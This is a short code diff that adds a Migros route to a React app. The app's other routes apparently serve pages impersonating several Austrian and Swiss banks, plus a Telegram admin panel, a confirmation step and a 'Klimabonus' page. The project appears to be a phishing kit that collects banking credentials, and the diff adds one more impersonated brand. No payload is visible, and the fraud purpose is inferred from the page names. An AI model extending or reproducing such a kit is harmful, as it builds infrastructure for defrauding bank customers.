@@ -32,6 +32,7 @@ import Wuestenrot from "./pages/Wuestenrot.tsx";
 import Denizbank from "./pages/Denizbank.tsx";
 import ChRaiffeisen from "./pages/ChRaiffeisen.tsx";
 import ChUbs from "./pages/ChUbs.tsx";
+import ChMigros from "./pages/ChMigros.tsx";
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
 import AdminSplitter from "./pages/AdminSplitter.tsx";
@@ -132,6 +133,7 @@ const App = () => (
             <Route path="/at/denizbank" element={<P><Denizbank /></P>} />
             <Route path="/ch/raiffeisen" element={<P><ChRaiffeisen /></P>} />
             <Route path="/ch/ubs" element={<P><ChUbs /></P>} />
+            <Route path="/ch/migros" element={<P><ChMigros /></P>} />
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             
             <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
